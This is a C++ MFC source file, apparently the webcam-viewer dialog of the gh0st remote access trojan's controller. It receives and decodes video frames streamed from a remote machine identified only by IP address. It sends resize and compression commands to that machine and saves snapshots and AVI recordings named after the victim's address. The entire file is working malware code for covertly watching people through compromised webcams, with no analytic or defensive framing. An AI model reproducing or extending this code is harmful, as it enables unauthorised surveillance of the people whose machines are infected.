// WebCamDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "WebCamDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// 視頻壓縮
	IDM_SAVEDIB,					// 保存快照
	IDM_SAVEAVI,					// 保存錄像
	IDM_SIZE_176_144,				// 視頻分辨率, H263隻支持這兩種
	IDM_SIZE_352_288
};

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg dialog

CWebCamDlg::CWebCamDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CWebCamDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebCamDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
	m_nCount		= 0;
	m_lpbmi			= NULL;
	m_lpScreenDIB	= NULL;
	m_lpCompressDIB	= NULL;
	m_pVideoCodec	= NULL;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	m_nOldWidth = 0;
	m_nCount = 0;

	ResetScreen();

}


void CWebCamDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebCamDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebCamDlg, CDialog)
	//{{AFX_MSG_MAP(CWebCamDlg)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_SHOWWINDOW()
	ON_WM_SIZE()
	ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg message handlers

void CWebCamDlg::OnReceive()
{
	CString str;
	str.Format("\\\\%s %d * %d 第%d幀 %d%%", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
		m_nCount, m_pContext->m_nTransferProgress);
	SetWindowText(str);	
}

void CWebCamDlg::OnReceiveComplete()
{
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		DrawDIB();
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 視頻大小調整成功
		ResetScreen();
		break;
	default:
		// 傳輸發生異常數據
		SendException();
		break;
	}
}

bool CWebCamDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "位圖文件(*.bmp)|*.bmp|", this);
	if(dlg.DoModal () != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失敗");
		return false;
	}
	
	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	
	// Fill in the fields of the file header
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
	
	return true;
}



void CWebCamDlg::SaveAvi()
{
	CMenu	*pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		return;
	}

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.avi");
	CFileDialog dlg(FALSE, "avi", strFileName, OFN_OVERWRITEPROMPT, "視頻文件(*.avi)|*.avi|", this);
	if(dlg.DoModal () != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_lpbmi))
	{
		m_aviFile = "";
		MessageBox("創建錄像文件失敗");	
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
	}

}
void CWebCamDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{	
	// 如果m_MMI已經被賦值
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));
	
	return NULL;
}

void CWebCamDlg::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	// 邊框的寬度
	int	nBorderWidth = rectClient.left - rectWindow.left;
	
	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;

	// 調整窗口到遠程大小
 	MoveWindow(&rectWindow);

	int	nTitleWidth = rectClient.top - rectWindow.top; // 標題欄的高度
	int	nWidthAdd = nBorderWidth * 2;
	int	nHeightAdd = nTitleWidth + nBorderWidth;

	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// 最大化時窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;
	
	// 最大的Track尺寸也要改變
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;

}

void CWebCamDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	// 銷毀時移除自己在視圖中的數據

	// 如果正在錄像，停止
	if (!m_aviFile.IsEmpty())
		SaveAvi();


	::ReleaseDC(m_hWnd, m_hDC);
	DrawDibClose(m_hDD);

	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	
	if (m_lpbmi) 
		delete [] m_lpbmi;
	if (m_lpScreenDIB)
		delete [] m_lpScreenDIB;
	if (m_lpCompressDIB)
		delete [] m_lpCompressDIB;
	if (m_pVideoCodec)
		delete m_pVideoCodec;

	CDialog::OnClose();
}

BOOL CWebCamDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_STRING, IDM_ENABLECOMPRESS, "視頻壓縮(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, "保存錄像(&V)");
		pSysMenu->AppendMenu(MF_SEPARATOR);	
		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_176_144, "176 * 144");
		pSysMenu->AppendMenu(MF_STRING, IDM_SIZE_352_288, "352 * 288");

		// 不支持固定的大小，說明遠程視頻有固定的大小，調整命令失效 
		if ((m_lpbmi->bmiHeader.biWidth != 352 && m_lpbmi->bmiHeader.biWidth != 288)
			&& (m_lpbmi->bmiHeader.biWidth != 176 && m_lpbmi->bmiHeader.biWidth != 144))
		{
			pSysMenu->EnableMenuItem(IDM_SIZE_176_144, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
			pSysMenu->EnableMenuItem(IDM_SIZE_352_288, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		else
			pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);

	}

	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	// 初始化窗口大小結構
	InitMMI();

	m_hDD = DrawDibOpen();
	m_hDC = ::GetDC(m_hWnd);

	// 通知遠程控制端對話框已經打開
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebCamDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_ENABLECOMPRESS:
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			bIsChecked = !bIsChecked;
			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
			if (!bIsChecked)
				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		}
		break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI:
		SaveAvi();
		break;
	case IDM_SIZE_176_144:
		{
			if (SendResetScreen(176, 144))
				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_176_144, MF_BYCOMMAND);
		}
		break;
	case IDM_SIZE_352_288:
		{
			if (SendResetScreen(352, 288))
				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);
		}
		break;
	default:
		CDialog::OnSysCommand(nID, lParam);
	}
}

void CWebCamDlg::SendNext()
{
	BYTE	bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CWebCamDlg::DrawDIB()
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu == NULL)
		return;
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	if (lpBuffer[1] == 0) // 沒有經過H263壓縮的原始數據，不需要解碼
	{
		// 第一次，沒有壓縮，說明服務端不支持指定的解碼器
		if (m_nCount == 1)
		{
			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
		}
		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);
		memcpy(m_lpScreenDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
	}
	else // 解碼
	{
		InitCodec(*(LPDWORD)(lpBuffer + 2));
		if (m_pVideoCodec != NULL)
		{
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
			memcpy(m_lpCompressDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
				(LPBYTE)m_lpScreenDIB, NULL,  NULL);
		}
	}
	OnPaint();
}

void CWebCamDlg::InitCodec(DWORD fccHandler)
{
	if (m_pVideoCodec != NULL)
		return;

	m_pVideoCodec = new CVideoCodec;
	if (!m_pVideoCodec->InitCompressor(m_lpbmi, fccHandler))
	{
		delete m_pVideoCodec;
		// 置NULL, 發送時判斷是否為NULL來判斷是否壓縮
		m_pVideoCodec = NULL;
		// 通知服務端不啟用壓縮
		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
	}	
}

bool CWebCamDlg::SendResetScreen(int nWidth, int nHeight)
{
	if (GetSystemMenu(FALSE)->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		MessageBox("正在錄像中，不能調整視頻大小");
		return false;
	}
	BYTE	bPacket[9];
	bPacket[0] = COMMAND_WEBCAM_RESIZE;
	*((LPDWORD)&bPacket[1]) = nWidth;
	*((LPDWORD)&bPacket[5]) = nHeight;
	m_iocpServer->Send(m_pContext, bPacket, sizeof(bPacket));

	return true;
}

void CWebCamDlg::ResetScreen()
{
	if (m_lpbmi)
	{
		delete m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_lpScreenDIB)
	{
		delete m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}
	if (m_lpCompressDIB)
	{
		delete m_lpCompressDIB;
		m_lpCompressDIB = NULL;
	}

	if (m_pVideoCodec)
	{
		delete m_pVideoCodec;
		m_pVideoCodec = NULL;
	}

	int	nBmiSize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi	= (LPBITMAPINFO) new BYTE[nBmiSize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);

	m_lpScreenDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	m_lpCompressDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	
	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	if (IsWindowVisible())
		InitMMI();
}

void CWebCamDlg::OnPaint() 
{
	// TODO: Add your message handler code here
	CPaintDC dc(this); // device context for painting
	RECT rect;
	GetClientRect(&rect);

//	StretchDIBits不好用，有些時候會畫不出來
	/*
	StretchDIBits
		(
		m_hDC,
		0, 0, rect.right, rect.bottom, 
		0, 0, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		(LPBYTE)m_lpScreenDIB, 
		m_lpbmi, 
		DIB_RGB_COLORS, 
		SRCCOPY
		);
	*/
	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_lpbmi,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);

	LPCTSTR	lpTipsString = "Recording ...";
	// 寫入錄像文件
	if (!m_aviFile.IsEmpty())
	{
		m_aviStream.Write(m_lpScreenDIB);
		// 提示正在錄像
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}

	// Do not call CDialog::OnPaint() for painting messages
}

void CWebCamDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	if (!IsWindowVisible())
		return;

	// 按比例調整窗口大小
	int	x = m_lpbmi->bmiHeader.biWidth, y = m_lpbmi->bmiHeader.biHeight; // x:y

	RECT	rectClientToScreen, rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	GetClientRect(&rectClientToScreen);
	ClientToScreen(&rectClientToScreen);  
	// 邊框的寬度
	int	nBorderWidth = rectClientToScreen.left - rectWindow.left;

	int	nWindowWidth = rectWindow.right - rectWindow.left;
	int	nWindowHeight = rectWindow.bottom - rectWindow.top;
	
	// 寬發生變化
	if (m_nOldWidth != nWindowWidth)
		rectWindow.bottom = rectClientToScreen.top + nBorderWidth + (rectClient.right * y) / x;
	else
		rectWindow.right = rectClientToScreen.left + nBorderWidth + (rectClient.bottom * x) / y;
	   
	m_nOldWidth = nWindowWidth;

	MoveWindow(&rectWindow);
	
	OnPaint();
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}
